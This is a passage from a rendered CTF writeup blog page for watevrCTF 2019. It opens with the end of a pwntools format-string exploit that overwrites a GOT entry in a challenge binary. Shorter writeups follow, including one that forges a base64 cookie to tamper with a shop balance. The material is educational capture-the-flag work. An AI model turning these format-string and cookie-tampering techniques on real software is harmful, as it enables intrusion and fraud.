+func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08420736</span>
+main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x084207fb</span>
+exit_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08422024</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pad</span>(s):
+	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">X</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(s))
+
+exploit <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">AA</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(exit_plt)
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(exit_plt<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">BBBBCCCC</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">8$1828x</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">8$n</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%65804x</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">9$n</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">print</span>(pad(exploit))
+payload <span style="color:#f92672">=</span> pad(exploit)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(pad(exploit))
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>The flag is - <strong>watevr{GOT_som3_fl4g_for_you_<a href="https://www.youtube.com/watch?v=hYeFcSq7Mxg">https://www.youtube.com/watch?v=hYeFcSq7Mxg</a>}</strong></p>
+<hr>
+<h1 id="other-categories">Other categories</h1>
+<h2 id="misc---unspaellablle">Misc - Unspaellablle</h2>
+<p>File: <a href="/post/2019-12-15_watevr-ctf-2019-writeups/files/orig.txt">orig.txt</a></p>
+<p>We are given a script for an episode of CHILDREN OF THE GODS by Jonathan Glassner &amp; Brad Wright. Initially I had no clue how to proceed, but then I googled this episode and specifically for its transcript.</p>
+<p>I found it at <a href="https://www.imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html">IMSDb</a>, and it was in the same format!!!</p>
+<p>After this it was just a matter of diffing using vimdiff to get the changed characters which was oir flag.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+
+
+  <a data-fancybox="" href="/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png" >
+<img src="/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png" alt="" ></a>
+
+
+
+</figure>
+
+<p>The flag is - <strong>watevr{icantspeel_tiny.cc/2qtdez}</strong></p>
+<p> </p>
+<h2 id="web---cookie-store">Web - Cookie Store</h2>
+<p>Webpage - <a href="http://13.48.71.231:50000/">http://13.48.71.231:50000/</a></p>
+<p>The page has a cookie - <strong>eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==</strong>, on decoding - <strong>{&ldquo;money&rdquo;: 50, &ldquo;history&rdquo;: []}</strong>.</p>
+<p>We see that the <em>Flag</em> cookie is for 100$, so if we set the cookie to base64({&ldquo;money&rdquo;: 200, &ldquo;history&rdquo;: []}), i.e. <strong>eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=</strong>.  With this our balance gets updated. Now we can buy the flag cookie and get the flag.</p>
+<p>The flag is - <strong>watevr{b64_15_4_6r347_3ncryp710n_m37h0d}</strong></p>
+<hr>
+<p>That's all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn't solve. I will add my version of their writeups when I get to know their solution.</p>
+<p> </p>
+<p>Follow me on <a href="https://twitter.com/shreyansh_26">Twitter</a>, <a href="https://github.com/shreyansh26">Github</a> or connect on <a href="https://www.linkedin.com/in/shreyansh26/">LinkedIn</a>.</p>
+
+    </div>
+
+    
+
+
+
+
+
+<div class="article-tags">
+  
+  <a class="badge badge-light" href="/tags/rev/">rev</a>
+  
+  <a class="badge badge-light" href="/tags/pwn/">pwn</a>
+  
+  <a class="badge badge-light" href="/tags/misc/">misc</a>
+  
+  <a class="badge badge-light" href="/tags/ctf/">ctf</a>
+  
+  <a class="badge badge-light" href="/tags/information-security/">information security</a>
+  
+  <a class="badge badge-light" href="/tags/infosec/">infosec</a>
+  
+  <a class="badge badge-light" href="/tags/writeups/">writeups</a>
+  
+</div>
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=/post/2019-12-15_watevr-ctf-2019-writeups/&amp;text=watevrCTF%202019%20Writeups%20%28Mainly%20Rev%20and%20Pwn%29" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=/post/2019-12-15_watevr-ctf-2019-writeups/&amp;t=watevrCTF%202019%20Writeups%20%28Mainly%20Rev%20and%20Pwn%29" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=watevrCTF%202019%20Writeups%20%28Mainly%20Rev%20and%20Pwn%29&amp;body=/post/2019-12-15_watevr-ctf-2019-writeups/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=/post/2019-12-15_watevr-ctf-2019-writeups/&amp;title=watevrCTF%202019%20Writeups%20%28Mainly%20Rev%20and%20Pwn%29" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://web.whatsapp.com/send?text=watevrCTF%202019%20Writeups%20%28Mainly%20Rev%20and%20Pwn%29%20/post/2019-12-15_watevr-ctf-2019-writeups/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  
+
+
+
+
+
+
+  
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="/authors/shreyansh-singh/"></a></h5>
+      
+      
+      <ul class="network-icon" aria-hidden="true">
+  
+</ul>
+
+    </div>
+  </div>
+
+
+
+
+<section id="comments">
+  
+    
+<div id="disqus_thread"></div>
+<script>
+  let disqus_config = function () {
+    
+    
+    
+  };
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+      return;
+    }
+    var d = document, s = d.createElement('script'); s.async = true;
+    s.src = 'https://' + "shreyansh26-netlify-com" + '.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+  
+</section>
+
+
+
+
+<div class="article-widget">
+  
+<div class="post-nav">
+  
+  
+  
+  <div class="post-nav-item">
+    <div class="meta-nav">Previous</div>
+    <a href="/post/2019-12-02_tuctf-pwn-2019/" rel="prev">TUCTF 2019 - Pwn &amp; Rev Challenges</a>
+  </div>
+  
+</div>
+
+</div>
+
+
+
+  
+  
+  <div class="article-widget content-widget-hr">
+    <h3>Related</h3>
+    <ul>
+      
+      <li><a href="/post/2019-12-02_tuctf-pwn-2019/">TUCTF 2019 - Pwn &amp; Rev Challenges</a></li>
+      
+      <li><a href="/post/2019-11-19_ritsec-ctf-2019/">RITSEC CTF 2019</a></li>
+      
+      <li><a href="/post/2019-08-25_codefest19-ctf-writeups/">Codefest’19 CTF Writeups</a></li>
+      
+      <li><a href="/post/2018-03-23_angstromctf-writeups/">AngstromCTF Writeups</a></li>
+      
+      <li><a href="/post/2018-02-27_neverlan-ctf-2018-writeups/">NeverLAN CTF 2018 Writeups</a></li>
+      
+    </ul>
+  </div>
+  
+
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/r.min.js"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/cpp.min.js"></script>
+        
+      
+
+      
+      
+    
+
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
+    
+
+    
+    
+    <script>const code_highlighting = true;</script>
+    
+
+    
+    
+    
+    
+    
+    
+    <script>
+      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
+      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+    <script id="dsq-count-scr" src="https://shreyansh26-netlify-com.disqus.com/count.js" async></script>
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.bcfae8267aba63cc55af53a503896bd9.js"></script>
+
+    
+
+
+
+
+
+
+  
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    © Shreyansh Singh 2019 &middot; 
+
+    Powered by 
+    
+    <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a>.
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" class="back-to-top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
